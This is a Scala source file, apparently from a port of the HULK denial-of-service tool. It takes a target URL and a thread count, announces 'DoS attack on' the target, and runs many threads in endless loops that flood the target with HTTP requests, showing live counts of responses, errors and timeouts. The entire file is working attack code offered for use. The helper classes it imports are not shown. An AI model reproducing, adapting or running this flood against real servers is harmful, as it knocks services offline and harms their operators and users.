import java.util.concurrent.Executors
import http._
import scopt.OParser
import scala.util.control.Breaks._
import scala.concurrent.Future
import scala.util.{Failure, Success}
import scala.concurrent._
// https://stackoverflow.com/questions/32306671/can-only-do-4-concurrent-futures-as-maximum-in-scala

object Hulk extends App {
  System.setProperty("sun.net.http.allowRestrictedHeaders", "true")

  val (url: String, maxProcess: Int, timeout: Int) =
    OParser.parse(utilities.ArgParser.parser, args, utilities.Config())
    match {
      case Some(c) =>
        (c.url, c.maxProcess, c.timeout)
      case _ =>
        sys.exit(1)
    }

  println(f"DoS attack on: $url")

  val host = new java.net.URI(url).getHost
  val headers = new Headers(host)
  val caller = new HttpCaller(url, headers, timeout)

  // Used for http calling threads
  val ec1 = ExecutionContext.fromExecutorService{Executors.newFixedThreadPool(maxProcess)}

  @volatile
  var sent = 0
  @volatile
  var err = 0
  @volatile
  var responseCode = 0
  @volatile
  var responded: collection.mutable.Set[Int] = collection.mutable.Set()
  @volatile
  var timedOut = 0
  @volatile
  var redirect = 0

  def threadFunc(i: Int): Unit ={
    while (true) {
      // Will expand the thread pool if global EC is used
      // https://stackoverflow.com/questions/29068064/scala-concurrent-blocking-what-does-it-actually-do
      responded.add(i)
      val r = blocking {
        caller()
      }
      responded.remove(i)
      r match {
        case Success(response) =>
          responseCode = response.code
          if (response.isSuccess)
            sent += 1
          if (response.isServerError)
            err += 1
          if (response.isRedirect)
            redirect += 1
          if (response.code == 429)
            break
        case Failure(_: java.net.SocketTimeoutException) =>
          timedOut += 1
        case Failure(_: java.net.ConnectException
                     |_: java.net.SocketException
                     |_: javax.net.ssl.SSLException) =>
        case Failure(e) => print(e)
      }
    }
  }

  println("In use              |\t Effective |\tResp OK |\tGot err " +
    "|\t TimeOut  |\t Redirect |\tLatest response")

  val futures = for (i <- 0 until maxProcess)
    yield Future(threadFunc(i))(ec1)

  while (true) {
    if (sent % 10 == 0) {
      val nFutures = futures.count(f => !f.isCompleted)
      val nResponse = responded.size
      print(f"\r$nFutures%6d of max $maxProcess%6d|\t$nResponse%6d     " +
        f"|\t$sent%7d |\t$err%7d |\t$timedOut%7d   |\t$redirect%7d   |\t$responseCode%6d")
    }
    Thread.sleep(100)
  }
}
